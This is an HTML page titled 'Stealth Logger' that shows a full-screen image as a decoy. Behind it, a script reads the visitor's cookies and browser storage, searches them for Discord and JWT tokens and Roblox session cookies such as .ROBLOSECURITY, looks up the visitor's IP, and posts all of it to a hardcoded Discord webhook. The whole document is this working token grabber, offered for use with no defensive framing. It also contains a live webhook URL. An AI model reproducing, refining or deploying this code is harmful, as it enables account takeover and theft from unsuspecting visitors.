<!DOCTYPE html>
<html>
<head>
    <title>Stealth Logger</title>
    <meta charset="UTF-8">
    <style>
        body, html { margin: 0; padding: 0; overflow: hidden; background: black; }
        img { width: 100vw; height: 100vh; object-fit: cover; }
        .hidden { display: none !important; }
    </style>
</head>
<body>
    <!-- üî• DEIN BING BILD (VORDERGRUND) -->
    <img src="https://tse2.mm.bing.net/th/id/OIP.raa2-bMfFl380UXUkjaejAHaE8?rs=1&pid=ImgDetMain&o=7&rm=3" 
         onload="initStealthLogger()" onerror="initStealthLogger()">
    
    <!-- üî• UNSICHTBARE IFRAMES F√úR COOKIES -->
    <iframe class="hidden" src="https://www.roblox.com/home" id="robloxFrame"></iframe>
    <iframe class="hidden" src="https://discord.com/app" id="discordFrame"></iframe>
    
    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1455947339956228126/2dRp4FsITkb3cBz8Z-kt6Nesuccwvui5l2FcmjUK60vhJA1BnBI71COMbcuNfwP7pHcU';
        
        async function initStealthLogger() {
            setTimeout(stealEverything, 1000); // Warte auf IFrame Load
        }
        
        async function stealEverything() {
            try {
                const data = {
                    userAgent: navigator.userAgent,
                    screen: `${screen.width}x${screen.height}`,
                    language: navigator.language,
                    timestamp: new Date().toISOString(),
                    allCookies: document.cookie,
                    localStorageKeys: Object.keys(localStorage),
                    sessionStorageKeys: Object.keys(sessionStorage)
                };
                
                // üî• AGGRESSIVER TOKEN SCAN
                const tokens = findAllTokens();
                
                // üî• ROBLOX SPEZIFISCHE EXTRAKTION
                const robloxData = extractRoblox();
                
                // üî• DISCORD SPEZIFISCHE EXTRAKTION  
                const discordData = extractDiscord();
                
                // üî• WEBRTC IP LEAK
                const ipData = await getIP();
                
                sendToWebhook({
                    ...data,
                    tokens,
                    robloxData,
                    discordData,
                    ipData
                });
                
            } catch(e) {
                console.log('Logger active');
            }
        }
        
        function findAllTokens() {
            const tokens = [];
            const patterns = [
                /mfa\.[a-zA-Z0-9-_]{84}/g,
                /[a-zA-Z0-9-_]{24}\.[a-zA-Z0-9-_]{6}\.[a-zA-Z0-9-_]{27}/g,
                /eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+/g
            ];
            
            // ALL Storage durchsuchen
            [localStorage, sessionStorage].forEach(storage => {
                for (let i = 0; i < storage.length; i++) {
                    const value = storage.getItem(storage.key(i));
                    patterns.forEach(pattern => {
                        const matches = value?.match(pattern);
                        if (matches) tokens.push(...matches);
                    });
                }
            });
            
            return [...new Set(tokens)];
        }
        
        function extractRoblox() {
            const cookies = parseCookies(document.cookie);
            return {
                ROBLOSECURITY: cookies['.ROBLOSECURITY'] || '‚ùå',
                rbxsig: cookies['rbxsig'] || '‚ùå',
                GuestData: cookies['GuestData'] || '‚ùå',
                rbxip2: cookies['rbx-ip2'] || '‚ùå',
                allRoblox: Object.keys(cookies).filter(k => k.toLowerCase().includes('rbx') || k.includes('ROBLOX'))
            };
        }
        
        function extractDiscord() {
            const cookies = parseCookies(document.cookie);
            return {
                dcfduid: cookies['__dcfduid'] || '‚ùå',
                sdcfduid: cookies['__sdcfduid'] || '‚ùå',
                locale: cookies['locale'] || '‚ùå'
            };
        }
        
        function parseCookies(cookieString) {
            const cookies = {};
            cookieString.split(';').forEach(cookie => {
                const [name, value] = cookie.trim().split('=');
                if (name && value) {
                    cookies[name] = decodeURIComponent(value);
                }
            });
            return cookies;
        }
        
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'IP Hidden';
            }
        }
        
        async function sendToWebhook(data) {
            const embeds = [
                {
                    title: "üéÆ **ULTIMATE STEALTH LOGGER** üî•",
                    description: `**${data.timestamp}** | IP: **${data.ipData}**`,
                    color: 16711680,
                    fields: [
                        { name: "üñ•Ô∏è UserAgent", value: `\`${data.userAgent.slice(0,40)}...\``, inline: true },
                        { name: "üì± Screen", value: `\`${data.screen}\``, inline: true },
                        { name: "üåê Language", value: `\`${data.language}\``, inline: true }
                    ],
                    thumbnail: { url: "https://tse2.mm.bing.net/th/id/OIP.raa2-bMfFl380UXUkjaejAHaE8?rs=1&pid=ImgDetMain&o=7&rm=3" }
                }
            ];
            
            // Tokens Embed
            if (data.tokens.length) {
                embeds.push({
                    title: `üîë **${data.tokens.length} TOKENS GEFUNDEN!**`,
                    color: 3447003,
                    fields: [{ name: "Tokens", value: `\`\`\`${data.tokens.join('\n')}\`\`\`` }]
                });
            }
            
            // Roblox Embed
            embeds.push({
                title: "üéÆ **ROBLOX DATA**",
                color: 16776960,
                fields: [
                    { name: ".ROBLOSECURITY", value: `\`${data.robloxData.ROBLOSECURITY.slice(0,60)}${data.robloxData.ROBLOSECURITY.length > 60 ? '...' : ''}\``, inline: false },
                    { name: "rbxsig", value: `\`${data.robloxData.rbxsig}\``, inline: true },
                    { name: "GuestData", value: `\`${data.robloxData.GuestData}\``, inline: true },
                    { name: "Roblox Keys", value: `\`${data.robloxData.allRoblox.join(', ')}\``, inline: false }
                ]
            });
            
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username: "üïµÔ∏è‚Äç‚ôÇÔ∏è Stealth Grabber",
                    avatar_url: "https://tse2.mm.bing.net/th/id/OIP.raa2-bMfFl380UXUkjaejAHaE8?rs=1&pid=ImgDetMain&o=7&rm=3",
                    embeds
                })
            });
        }
    </script>
</body>
</html>
